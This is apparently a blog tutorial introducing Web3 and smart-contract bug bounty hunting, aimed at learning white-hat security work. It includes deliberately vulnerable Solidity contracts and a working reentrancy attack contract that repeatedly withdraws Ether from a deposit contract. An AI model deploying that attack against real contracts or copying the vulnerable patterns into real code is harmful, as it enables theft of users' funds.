---
layout: post
title:  "Hacking Web3: Introduction and How to Start"
post-title:  "Hacking Web3: Introduction and How to Start"
date: 2022-05-19
categories: web3
---

Hacking Web3: Introduction and How to Start
===========================================

Web3 is a newfound technology, and it’s claimed that it can greatly increase the security of the websites using it. In fact, web3 is a new version of our old World Wide Web, but this time decentralized and based on blockchain. Web3 works with blockchain, cryptocurrencies, and NFTs. Because Web 3 is a new technology, companies are not prepared for new risks and security issues, and the winner is the one who can forecast and prevent all possible security issues.  
Since millions of dollars a day are at stake in web3 applications, today, some Web3 companies have signed up for a bug bounty program and pay white hat hackers to secure their business.

Concepts :
==========

Decentralized Finance (DeFi):
-----------------------------

Provides financial instruments without relying on intermediaries such as brokerages or banks, using smart contracts. These applications allow users to save, borrow, lend and trade without any fees (that any financial company like the bank receives). Also, these applications are very fast and anyone can use them without any approval. This means anyone anywhere just with an internet connection can access these financial services. DeFi applications use the blockchain, and applications named DApps manage and handle transactions.

Decentralized Application (DApp):
---------------------------------

A decentralized application is an application on a decentralized network that provides a frontend user interface combined with a smart contract that is developed and powered by Ethereum. Centralized applications use a single computer, but DApps operate on a peer-to-peer network of computers and use blockchain for data storage. On Ethereum, smart contracts are open-source and transparent.

Web3 Bug Bounty :
-----------------

Web3 bug bounty is almost a new topic and there are not many platforms for it. But in 2017, a new cybersecurity consulting company named [**Hacken**](http://hacken.io) started working on providing cybersecurity services for blockchain security. [**Hackenproof**](https://hackenproof.com/)  is a part of the Hacken group. Also, [**Immunefi**](https://immunefi.com/)  is a good web3 bug bounty platform, that was founded in 2020. Immunefi offers the largest bounties to white hackers, for example, a single program (wormhole) in Immunefi offers **$10,000,000** for critical smart contract bugs.

Foundations:
============

In all disciplines, you need strong foundations to become an expert.  
For example, in a car race, imagine you have a good car, but you don’t know much about the way or your car’s possibilities, in parallel your friend has a normal car, but he knows the routes well and also knows what he can do to get faster and go through the way easier by using his car’s abilities. So, guess who wins? Yes, your friend. This means a professional Solidity developer knows where critical functions have been implemented and where the contract developer might make a mistake, but how does a hacker who does not know about smart contract development want to hack a smart contract?  
That’s why I highly recommend you to learn more about the principles of the blockchain, how Ethereum works and how to develop a smart contract.  
First, you need to know what blockchain is, and how it works, [Blockchain Theory 101](https://www.udemy.com/course/blockchain-theory-101/) Udemy course and [The Blockchain Developer](https://www.amazon.com/Blockchain-Developer-Implementing-Distributed-Blockchain-based/dp/1484248465) by Elad Elrom are good resources for blockchain basics. Since all smart contracts and Ethereum accounts live in Ethereum virtual machine, you should know about that. Mastering Ethereum by Andreas Antonopoulos is a book about how Ethereum works.

Programming is another important thing that you should learn. As you know, all Ethereum Decentralized applications (DApps) have a smart contract (usually written by Solidity) and a frontend user interface. The smart contract that you use it might be written by you or another because mentioned before every smart contract in Ethereum is open source.

Transparency and accessibility are good features of DeFi, In Web 2.0, a small development team wrote the code, and others could not see the program code, but in Web3, applications are developed in full view of everyone.

The most popular smart contract language is Solidity. This language is an object-oriented, high-level language for implementing smart contracts. If you already know a programming language, learning Solidity is very easy for you, “[Solidity by example](https://solidity-by-example.org/)” is a better resource for learning Solidity.  
Another popular language for writing smart contracts is JavaScript. This popular language works on both client and server-side. The Book “[JavaScript: The Definitive Guide](https://www.amazon.it/dp/0596805527)” is the best way to learn JavaScript. The most popular web3 libraries for JavaScript are web3.js and ethers.js.  
Apart from these two languages, Viper and Rust are also good languages for smart contracts.

Vulnerabilities in Web3 :
=========================

Web3 bugs are not like web2 bugs, and there are many differences.  
You can find web2 bugs in web3 applications, not in smart contracts. In web2 we classify vulnerabilities with CWE, but in the smart contract, we classify issues with **Smart Contract Weakness Classification** (SWC). You can find a full list of smart contract weaknesses in The [SWC Registry](https://swcregistry.io/).

In this article, you will be familiar with some of the most popular web3 vulnerabilities.

Function default visibility (SWC-100)
-------------------------------------

This issue occurs when a developer forgets to set proper visibility for a function and a malicious user (hacker) can make unauthorized or unintended state changes.

```
pragma solidity ^0.4.24;  
**contract** **FunctionDefaultVisibility** {  
   **function** **withdrawWinnings**() {  
     **require**(**uint32**(msg.sender) == 0);  
     \_sendWinnings();  
   }  
   **function** **\_sendWinnings**() {  
     msg.sender.transfer(this.balance);  
   }  
}
```

As you can see, no function visibility (private, public, internal…) has been set.

Unprotected Ethereum Withdrawal (SWC-105)
-----------------------------------------

Due to missing or insufficient access controls, malicious parties can withdraw all ethers from the contract. This issue is sometimes caused by unintentionally exposing init functions. By wrongly naming a function intended to be a constructor, the constructor code ends up in the runtime byte code and can be called by anyone to reinitialize the contract.

Re-entrancy (SWC-107)
---------------------

In a reentrancy attack, a malicious contract (attacker contract) calls back into the calling contract before the first invocation of the function is completed. This may lead to the different invocations of the function to interact in undesirable ways.

**Example of a vulnerable contract :**

```
contract DepositFunds {  
    mapping(address => uint) public balances;  
  
    function deposit() public payable {  
        balances\[msg.sender\] += msg.value;  
    }  
  
    function withdraw() public {  
        uint bal = balances\[msg.sender\];  
        require(bal > 0);  
  
        (bool sent, ) = msg.sender.call{value: bal}("");  
        require(sent, "Failed to send Ether");  
  
        balances\[msg.sender\] = 0;  
    }  
  
  
}
```

The vulnerability comes when the user requested an amount of ethers. In this case, the attacker calls the `withdraw()`function. He can transfer tokens even though he has already received tokens because his balance is not yet set to 0.

**How to exploit them?**

An attacker can create the following contract and exploit the reentrancy vulnerability :

```
contract Attack {  
    DepositFunds public depositFunds;  
  
    constructor(address \_depositFundsAddress) {  
        depositFunds = DepositFunds(\_depositFundsAddress);  
    }  
  
    // Fallback is called when DepositFunds sends Ether to this contract.  
    fallback() external payable {  
        if (address(depositFunds).balance >= 1 ether) {  
            depositFunds.withdraw();  
        }  
    }  
  
    function attack() external payable {  
        require(msg.value >= 1 ether);  
        depositFunds.deposit{value: 1 ether}();  
        depositFunds.withdraw();  
    }  
  
  
}
```

Read more about [**The Reentrancy Attack**](https://hackernoon.com/hack-solidity-reentrancy-attack)**.**

Malleable signatures (SWC-117)
------------------------------

Often, people assume that the use of a cryptographic signature system in Ethereum contracts verifies that signatures are unique, but signatures in Ethereum can be altered without the possession of the private key and remain valid. For example, elliptic key cryptography consists of three variables: _v_, _r_, and _s_ and if these values are modified in just the right way, you can obtain a valid signature with an invalid private key.

Write to Arbitrary location (SWC-124)
-------------------------------------

A smart contract’s data is persistently stored at some storage location on the EVM level. The contract is responsible for ensuring that only authorized user or contract accounts may write to sensitive storage locations.

If an attacker can write to arbitrary storage locations, the authorization checks may easily be bypassed. It allows an attacker to overwrite a field that contains the address of the owner.

```
pragma solidity ^0.4.25;  
contract Wallet {  
  uint\[\] private bonusCodes;  
  address private owner; constructor() public {  
        bonusCodes = new uint\[\](0);  
        owner = msg.sender;  
  } function () public payable {  
  } function PushBonusCode(uint c) public {  
        bonusCodes.push(c);  
  } function PopBonusCode() public {  
        require(0 <= bonusCodes.length);  
        bonusCodes.length--;  
  } function UpdateBonusCodeAt(uint idx, uint c) public {  
        require(idx < bonusCodes.length);  
        bonusCodes\[idx\] = c;  
  } function Destroy() public {  
        require(msg.sender == owner);  
        selfdestruct(msg.sender);  
  }  
}
```

As you can see, in **line 4** the `bonusCodes` variable declared that in **line 26** we can write in this location.

Then...
===========

Now that you have enough knowledge about DeFi, DApp, and Web3, I recommend learning more about the smart contract weaknesses, this can be very helpful. If you want an Ethereum virtual machine to test smart contract bugs on them, CTFs can help. You can practice the lessons learned and become more familiar with Web3 hacking. [Ethernaut Game](https://ethernaut.openzeppelin.com), [Capture the ether](https://capturetheether.com), and [VulnerableDefi](https://damnvulnerabledefi.xyz) are the best CTFs for practicing smart contract vulnerabilities.

Solutions for these CTFs are available on [**Hackernoon**](https://hackernoon.com/) and you can find them there with the _solidity-hack_ tag.

Also, tools can help you in the hunting process, with automation you can find more and more bugs. The best web3 hacking tools are [Mythril](https://github.com/ConsenSys/mythril), [Surya](https://github.com/ConsenSys/surya), [Seth](https://github.com/dapphub/dapptools/tree/master/src/seth), and [DAppTools](https://github.com/dapphub/dapptools).

After a lot of practice and learning, you become a skilled web3 hacker, then you can log on to web3 bug bounty platforms, select a program and start hacking. Of course, you can do this as a practice when you are learning, but it is good when you are an expert to go to existing platforms and earn money.

Conclusion:
===========

No technology is perfect, and security is never 100%. To hack stuff you just have to start and learn, and practice, practice, and practice.
